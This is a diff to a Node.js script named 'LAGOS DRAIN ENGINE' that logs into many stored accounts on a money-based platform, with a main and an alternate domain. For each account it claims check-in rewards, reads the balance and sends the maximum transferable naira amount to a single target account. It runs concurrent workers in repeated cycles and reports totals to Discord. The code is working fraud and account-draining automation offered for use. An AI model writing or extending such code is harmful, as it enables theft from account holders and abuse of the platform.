@@ -19,9 +19,9 @@ try {
     const raw = fs.readFileSync(`${storeDir}/${file}`, 'utf8');
     if (raw.trim()) ledger.push(...JSON.parse(raw));
   }
-} catch(e) { console.log("[INIT]", e.message); }
+} catch(e) { console.log("[INIT ERROR]", e.message); }
 
-if (!ledger.length) { console.log("[ERROR] No accounts"); process.exit(1); }
+if (!ledger.length) { console.log("[ERROR] No accounts found in ./store"); process.exit(1); }
 
 const sleep = ms => new Promise(r => setTimeout(r, ms));
 
@@ -33,6 +33,8 @@ function secureShuffle(arr) {
   }
   return arr;
 }
+
+function tag(i, total, u) { return `[${i+1}/${total}][${u}]`; }
 
 async function req(url, opts = {}, cookie = '') {
   opts.headers = opts.headers || {};
@@ -56,8 +58,14 @@ async function discord(msg) {
 
 (async () => {
   secureShuffle(ledger);
-  console.log(`Loaded ${ledger.length} accounts`);
-  discord(`🚀 Engine online — ${ledger.length} accounts loaded`);
+  console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
+  console.log(`  LAGOS DRAIN ENGINE`);
+  console.log(`  Accounts : ${ledger.length}`);
+  console.log(`  Workers  : ${CONCURRENT_LIMIT}`);
+  console.log(`  Target   : ${TO}`);
+  console.log(`  Domains  : MAIN + ALT fallback`);
+  console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`);
+  discord(`🚀 Engine online — ${ledger.length} accounts loaded. TO: ${TO}`);
 
   const sessionStart = Date.now();
   let sessionTotal = 0, globalCycles = 0;
@@ -67,6 +75,7 @@ async function discord(msg) {
     globalCycles++;
     let idx = 0, cycleTotal = 0;
     let drained = 0, checkinOnly = 0, broke = 0, fail = 0;
+    console.log(`\n┌─ CYCLE #${globalCycles} STARTED — ${new Date().toISOString()}`);
 
     async function worker(wid) {
       await sleep(Math.floor(Math.random() * 100) + wid * 15);
@@ -74,82 +83,112 @@ async function discord(msg) {
       while (idx < ledger.length) {
         const i = idx++, a = ledger[i];
         if (!a) break;
+        const t = tag(i, ledger.length, a.u);
 
         try {
-          // try main domain first, fall back to alt
-          let cookie = '', API = API_MAIN;
-          for (const domain of [API_MAIN, API_ALT]) {
-            const lr = await req(`${domain}/auth/login`, {
+          // ── LOGIN ──────────────────────────────────────────
+          let cookie = '', API = '', domain = '';
+          for (const [label, base] of [['MAIN', API_MAIN], ['ALT', API_ALT]]) {
+            const lr = await req(`${base}/auth/login`, {
               method: "POST",
               headers: { "content-type": "application/json" },
               body: JSON.stringify({ username: a.u, password: a.p })
             });
-            if (lr.res.ok) { cookie = lr.cookie; API = domain; break; }
+            if (lr.res.ok) {
+              const lj = await lr.res.json().catch(() => ({}));
+              if (lj.user || lj.ok !== false) {
+                cookie = lr.cookie; API = base; domain = label;
+                console.log(`${t} ✅ LOGIN ok via ${label}`);
+                break;
+              }
+            }
+            console.log(`${t} ❌ LOGIN failed via ${label} — status ${lr.res.status ?? 0}`);
           }
-          if (!cookie) { fail++; continue; }
+          if (!cookie) { fail++; console.log(`${t} ⛔ SKIP — no domain accepted login`); continue; }
 
-          // checkin — server writes srv.streak directly, may restore canSend
-          await req(`${API}/levels`, {
+          // ── CHECKIN ────────────────────────────────────────
+          const cr = await req(`${API}/levels`, {
             method: "POST",
             headers: { "content-type": "application/json" },
             body: JSON.stringify({ op: "checkin", xp: 5 })
           }, cookie);
+          const cj = cr.res.ok ? await cr.res.json().catch(() => ({})) : {};
+          console.log(`${t} 📅 CHECKIN → status:${cr.res.status} money:${cj.money ?? '?'} streak:${cj.streak?.streak ?? '?'}`);
 
-          // get save — check canSend + money
+          // ── GET SAVE ───────────────────────────────────────
           const svr = await req(`${API}/save`, {}, cookie);
           const sv  = svr.res.ok ? await svr.res.json() : null;
-          if (!sv?.game) { fail++; continue; }
+          if (!sv?.game) { fail++; console.log(`${t} ⛔ SKIP — no game state`); continue; }
 
           const canSend = sv.canSend ?? 0;
-          let amount = Math.min(
-            Math.floor(Number(sv.game.money ?? 0)) - FEE,
-            canSend - FEE
-          );
+          const money   = Math.floor(Number(sv.game.money ?? 0));
+          console.log(`${t} 💰 SAVE → money:₦${money.toLocaleString()} canSend:₦${canSend.toLocaleString()}`);
 
-          // if canSend still 0, try seeding on alt domain
+          // ── ALT DOMAIN CHECK if canSend=0 ─────────────────
+          let useAPI = API, useDomain = domain, useMoney = money, useCanSend = canSend;
           if (canSend <= MIN && API === API_MAIN) {
-            const svAlt = await req(`${API_ALT}/save`, {}, cookie);
-            const altSv = svAlt.res.ok ? await svAlt.res.json() : null;
+            console.log(`${t} 🔄 canSend=0 on MAIN — checking ALT...`);
+            const altSvr = await req(`${API_ALT}/save`, {}, cookie);
+            const altSv  = altSvr.res.ok ? await altSvr.res.json() : null;
             if (altSv?.canSend > MIN) {
-              amount = Math.min(Math.floor(Number(altSv.game?.money ?? 0)) - FEE, altSv.canSend - FEE);
-              API = API_ALT;
+              useAPI = API_ALT; useDomain = 'ALT';
+              useMoney   = Math.floor(Number(altSv.game?.money ?? 0));
+              useCanSend = altSv.canSend;
+              console.log(`${t} ✅ ALT canSend:₦${useCanSend.toLocaleString()} money:₦${useMoney.toLocaleString()}`);
+            } else {
+              console.log(`${t} ❌ ALT canSend also 0 — account blocked`);
+              checkinOnly++; continue;
             }
           }
 
-          if (amount < MIN) { broke++; continue; }
+          // ── SEND ───────────────────────────────────────────
+          let amount = Math.min(useMoney - FEE, useCanSend - FEE);
+          if (amount < MIN) { broke++; console.log(`${t} 💸 SKIP — amount ₦${amount} below min`); continue; }
 
-          // send
-          const sr = await req(`${API}/send`, {
+          console.log(`${t} 📤 SENDING ₦${amount.toLocaleString()} via ${useDomain}...`);
+          const sr = await req(`${useAPI}/send`, {
             method: "POST",
             headers: { "content-type": "application/json" },
             body: JSON.stringify({ to: TO, amount })
           }, cookie);
 
-          if (sr.res.ok) {
-            const sj = await sr.res.json().catch(() => ({}));
-            if (sj.ok !== false) {
-              cycleTotal += amount; sessionTotal += amount; drained++;
-              console.log(`[✓] [${i+1}/${ledger.length}] ${a.u} → ₦${amount.toLocaleString()} via ${API.includes('eliy') ? 'ALT' : 'MAIN'} | Total: ₦${sessionTotal.toLocaleString()}`);
-            } else { broke++; }
+          const sBody = await sr.res.text?.() ?? '';
+          let sj = {};
+          try { sj = JSON.parse(sBody); } catch(_) {}
+
+          if (sr.res.ok && sj.ok !== false) {
+            cycleTotal += amount; sessionTotal += amount; drained++;
+            console.log(`${t} ✅ SENT ₦${amount.toLocaleString()} | Running: ₦${sessionTotal.toLocaleString()}`);
           } else {
-            const err = await sr.res.text?.() ?? '';
-            if (err.includes('canSend') || err.includes('0')) { checkinOnly++; }
-            else { fail++; }
+            broke++;
+            console.log(`${t} ❌ SEND FAILED → ${sBody.slice(0, 120)}`);
           }
 
           await sleep(10);
-        } catch(e) { fail++; }
+        } catch(e) {
+          fail++;
+          console.log(`${tag(i, ledger.length, a?.u ?? '?')} 💥 EXCEPTION: ${e.message}`);
+        }
       }
     }
 
     await Promise.all(Array.from({ length: CONCURRENT_LIMIT }, (_, i) => worker(i)));
     secureShuffle(ledger);
 
-    const summary = `\n--- CYCLE #${globalCycles} ---\nDrained: ${drained} | CheckinOnly: ${checkinOnly} | Broke: ${broke} | Fail: ${fail}\nCycle: ₦${cycleTotal.toLocaleString()} | Total: ₦${sessionTotal.toLocaleString()}\n`;
-    console.log(summary);
-    discord(`📊 Cycle #${globalCycles} — Drained: ${drained} | ₦${cycleTotal.toLocaleString()} | Running total: ₦${sessionTotal.toLocaleString()}`);
+    const elapsed = Math.round((Date.now() - sessionStart) / 1000);
+    console.log(`\n└─ CYCLE #${globalCycles} DONE`);
+    console.log(`   Drained    : ${drained}`);
+    console.log(`   CheckinOnly: ${checkinOnly} (canSend=0 both domains)`);
+    console.log(`   Broke      : ${broke}`);
+    console.log(`   Failed     : ${fail}`);
+    console.log(`   Cycle ₦    : ₦${cycleTotal.toLocaleString()}`);
+    console.log(`   Total ₦    : ₦${sessionTotal.toLocaleString()}`);
+    console.log(`   Elapsed    : ${elapsed}s`);
+
+    discord(`📊 Cycle #${globalCycles}\n✅ Drained: ${drained} | ⛔ Blocked: ${checkinOnly} | 💥 Fail: ${fail}\n💰 Cycle: ₦${cycleTotal.toLocaleString()} | Total: ₦${sessionTotal.toLocaleString()}`);
     await sleep(200);
   }
 
-  discord(`🏁 Done — ₦${sessionTotal.toLocaleString()} total across ${globalCycles} cycles`);
+  discord(`🏁 FINISHED — ₦${sessionTotal.toLocaleString()} across ${globalCycles} cycles`);
+  console.log(`\nFINISHED — ₦${sessionTotal.toLocaleString()} total`);
 })();
